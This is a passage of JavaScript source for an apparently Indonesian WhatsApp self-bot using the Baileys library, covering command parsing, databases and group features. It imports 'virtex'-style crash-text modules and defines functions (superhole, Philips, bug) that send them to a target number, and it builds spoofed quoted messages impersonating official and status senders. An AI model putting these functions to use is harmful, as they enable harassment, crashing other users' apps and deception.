const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  RekurzxddectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const hx = require('hxz-api')
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const simple = require('./lib/simple.js')
//const { smsg } = require('./lib/simple')
const fetch = require('node-fetch');
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const yntkts = require('./src/settings.json')
const { latx, latx2 } = require('./database/latx')
const { virtex } = require('./hm/virtex')
const { virtex2 } = require('./hm/virtex2')
const { virtex3 } = require('./hm/virtex3')
const { virtex4 } = require('./hm/virtex4')
const { virtex5 } = require('./hm/virtex5')
const { virtex6 } = require('./hm/virtex6')
const { virtex7 } = require('./hm/virtex7')
const { virtex8 } = require('./hm/virtex8')
const { coba } = require('./hm/coba')
const { virtex9 } = require('./hm/virtex9')
const { ngazap } = require('./hm/ngazap')
const { virtag } = require('./hm/virtag')
const { emoji2 } = require('./hm/emoji2')
const { katalog } = require('./hm/katalog')
const { bugr } = require('./hm/bugr')
const { help } = require('./hm/help')
const { desk } = require('./hm/desk')
const { xixi } = require('./hm/xixi')
const { bugweb } = require('./hm/bugweb.js')
const { titik } = require('./hm/titik.js')
const { iphone } = require('./hm/iphone.js')
const { vapi } = require('./hm/vapi.js')
const { jadivirtex1 } = require('./message/jadivirtex1')
const { spamvirtex } = require('./message/spamvirtex')
const { catalog } = require('./hm/catalog.js')
const { judul } = require('./hm/judul.js')
const { bughole } = require('./hm/bughole')
const { link1 } = require('./random/link1')
const { link2 } = require('./random/link2')
const { link3 } = require('./random/link3')
const { jadicatalog } = require('./src/jadicatalog')
 const { virtexctlgg } = require('./src/virtexctlgg')
const { virtexbykurz } = require('./hm/virtexbykurz')
const converter = require('./lib/converter.js')
const iye = fs.readFileSync('./logo.jpg')
const fake = fs.readFileSync('./logo.jpg')
const thumb = fs.readFileSync('./logo.jpg')
const bgg = fs.readFileSync('./logo.jpg')
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
virgam = fs.readFileSync(`./message/virgam.jpeg`)
virgamv2 = fs.readFileSync("./message/punyathunder.jpeg")
virgamv3 = fs.readFileSync("./message/kon.jpg")

let commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
let antitoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
let setiker = JSON.parse(fs.readFileSync('./database/temp/stik.json'))
let ntilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
let imagenye = JSON.parse(fs.readFileSync('./database/temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./database/temp/video.json'))
let welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let autosticker = JSON.parse(fs.readFileSync('./src/autosticker.json'))
let antilinkig = JSON.parse(fs.readFileSync('./database/group/antilinkig.json'))
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let areatext = require ('./message/teks')


//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja🌞";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore🌄";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siang☀️";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi🌅";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam🌃";
    }
    

menusimpel = false
banChats = false;
offline = false;
antidel = false;
welcom = false;
antical = false
readGc = true; 
readPc = false;
autovn = true;
multi = true
harga = 20000
matauang = 'USD'
nopref = false
numbernye = '0'
autoketik = false;
prefixStatus = true;
const nomerOwner = yntkts.nomerOwner
const zixi = yntkts.zixi
const namabot = yntkts.namabot
const fakee = yntkts.fakee
const namaowner = yntkts.namaowner
const namadua = yntkts.namadua
const XChillDs = yntkts.XChillDs
const ZeksApi = yntkts.ZeksApi
const namatiga = yntkts.namatiga
const lolkey = yntkts.lolkey
ownerNumber = [`${nomerOwner}`]
waktu = "-";
alasan = "-"; 
autojoin = false;
cmhit = []
hit_today = [];
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// 𝗙𝘂𝗻𝗰𝗮𝘁𝗶𝗼𝗻 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 シ︎
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};

module.exports = kurz = async (kurzxd, kurz) => {
  try {
    if (!kurz.hasNewMessage) return;
    kurz = kurz.messages.all()[0];
    if (!kurz.message) return;
    if (kurz.key && kurz.key.remoteJid == "status@broadcast") return;
    global.blocked;
    kurz.message =
      Object.keys(kurz.message)[0] === "ephemeralMessage"
        ? kurz.message.ephemeralMessage.message
        : kurz.message;
const typei = Object.keys(kurz.message)[0]
const type = Object.keys(kurz.message)[0]
let _chats =
      type === "conversation" && kurz.message.conversation
        ? kurz.message.conversation
        : type == "imageMessage" && kurz.message.imageMessage.caption
        ? kurz.message.imageMessage.caption
        : type == "videoMessage" && kurz.message.videoMessage.caption
        ? kurz.message.videoMessage.caption
        : type == "extendedTextMessage" && kurz.message.extendedTextMessage.text
        ? kurz.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && kurz.message[type].selectedButtonId
        ? kurz.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(kurz.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(kurz.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(kurz.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && kurz.message.conversation) ? kurz.message.conversation : (type == 'imageMessage') && kurz.message.imageMessage.caption ? kurz.message.imageMessage.caption : (type == 'videoMessage') && kurz.message.videoMessage.caption ? kurz.message.videoMessage.caption : (type == 'extendedTextMessage') && kurz.message.extendedTextMessage.text ? kurz.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(kurz.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(kurz.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(kurz.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(kurz.message);
    const from = kurz.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && kurz.message.listResponseMessage.title) ? kurz.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && kurz.message.buttonsResponseMessage.selectedButtonId) ? kurz.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && kurz.message.conversation.startsWith(prefix)) ? kurz.message.conversation : (type == 'imageMessage') && kurz.message.imageMessage.caption.startsWith(prefix) ? kurz.message.imageMessage.caption : (type == 'videoMessage') && kurz.message.videoMessage.caption.startsWith(prefix) ? kurz.message.videoMessage.caption : (type == 'extendedTextMessage') && kurz.message.extendedTextMessage.text.startsWith(prefix) ? kurz.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(kurz.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(kurz.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(kurz.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? kurz.message.conversation : (typei === 'extendedTextMessage') ? kurz.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? kurz.message.conversation : (type === 'extendedTextMessage') ? kurz.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && kurz.message.conversation) ? kurz.message.conversation : (type == 'imageMessage') && kurz.message.imageMessage.caption ? kurz.message.imageMessage.caption : (type == 'videoMessage') && kurz.message.videoMessage.caption ? kurz.message.videoMessage.caption : (type == 'extendedTextMessage') && kurz.message.extendedTextMessage.text ? kurz.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = kurzxd.user.jid;
    
    const botNumberss = kurzxd.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    function superhole(nomor){
for(let i=0;i < 1;i++){
let nyefir = areatext.barVir(prefix)
kurzxd.sendMessage(nomor, nyefir, MessageType.extendedText, {quoted: fdoc})
}
function bug(jid){
for(let i=0;i < 1;i++){
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
kurzxd.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
  }
  function Philips(nomor){
for(let i=0;i < 1;i++){
let nyelips = areatext.Philips(prefix)
kurzxd.sendMessage(nomor, nyelips, MessageType.extendedText, {quoted: fdoc})
}
  }const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
    const isWelkom = isGroup ? welkom.includes(from) : false
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙂𝙘
var ampun = await kurzxd.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await kurzxd.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙍𝙚𝙖𝙙 𝙋𝙘
var chatss = await kurzxd.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await kurzxd.chatRead(jid)
})
// 𝘼𝙪𝙩𝙤 𝙑𝙣:𝙫
if (autovn) {
	if (autovn === false) return
await kurzxd.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await kurzxd.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const sender = kurz.key.fromMe
      ? kurzxd.user.jid
      : isGroup
      ? kurz.participant
      : kurz.key.remoteJid;
    let senderr = kurz.key.fromMe
      ? kurzxd.user.jid
      : kurz.key.remoteJid.endsWith("@g.us")
      ? kurz.participant
      : kurz.key.remoteJid;
    const totalchat = await kurzxd.chats.all();
    const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(kurzxd, kurz);
    const groupMetadata = isGroup ? await kurzxd.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = kurz.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = kurz.key.fromMe
      ? kurzxd.user.jid
      : kurzxd.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = kurz.key.fromMe
      ? kurzxd.user.name
      : conts.notify || conts.vname || conts.name || "-";
			
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "𝙒𝙖𝙞𝙩 𝘼 𝙈𝙞𝙣𝙪𝙩𝙚 シ︎",
      success: "𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹シ︎",
      wrongFormat: "Format salah, coba liat lagi di menu",
      error: {
        stick: "bukan sticker itu:v",
        apiz: "Nulisnya Jan Kepanjangan Erorkan",
        Iv: "Linknya error:v",
      },
      only: {
        group: "Khusus grup ngab",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {
      kurzxd.sendMessage(from, teks, text, { quoted: kurz });
    };*/
    const textImg = (teks) => {
           return ikyy.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./logo.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			kurzxd.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: kurz, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6281314050985?text=Assalamualaikum`}}})
		}*/
    const sendMess = (hehe, teks) => {
      kurzxd.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? kurzxd.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : kurzxd.sendMessage(from, teks.trim(), extendedText, {
            quoted: kurz,
            contextInfo: { mentionedJid: memberr },
          });
    };
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "6289523258649-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "BODY BOTZ",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./logo.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./database/group/logo.jpg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPaNAy7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
                      
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6288213840883-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6289643739077-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `628551000185@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      kurzxd.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      kurzxd.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./database/group/logo.jpg"),
        quoted: kurz,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      kurzxd.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
kurzxd.on('CB:action,,battery', json => {
		global.batteryLevelStr = json[2][0][1].value
	   global.batterylevel = parseInt(batteryLevelStr)
		baterai = batterylevel
        if (json[2][0][1].live == 'true') charging = true
       if (json[2][0][1].live == 'false') charging = false
        console.log(json[2][0][1])
		console.log('Baterai : ' + batterylevel+'%')
	})
	global.batrei = global.batrei ? global.batrei : []
		kurzxd.on('CB:action,,battery', json => {
		const batteryLevelStr = json[2][0][1].value
		const batterylevel = parseInt(batteryLevelStr)
		global.batrei.push(batterylevel)
		}) 
download(url, "./stik" + names + ".png", async function () {
        console.log("selesai");
        let filess = "./stik" + names + ".png";
        let asw = "./stik" + names + ".webp";
        exec(
          `ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`,
          (err) => {
            let media = fs.readFileSync(asw);
            kurzxd.sendMessage(to, media, MessageType.sticker, { quoted: kurz });
            fs.unlinkSync(filess);
            fs.unlinkSync(asw);
          }
        );
      });
    };
if (budy.toLowerCase() === `8473`){
		if (isRegister) return 
		    register.push(sender)
		    fs.writeFileSync('./database/user/registered.json', JSON.stringify(register))
		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    kurzxd.sendMessage(from, teks, text, {quoted: fkontak })
}          /*if (!kurz.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./database/group/logo.jpg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "SELF BOT",
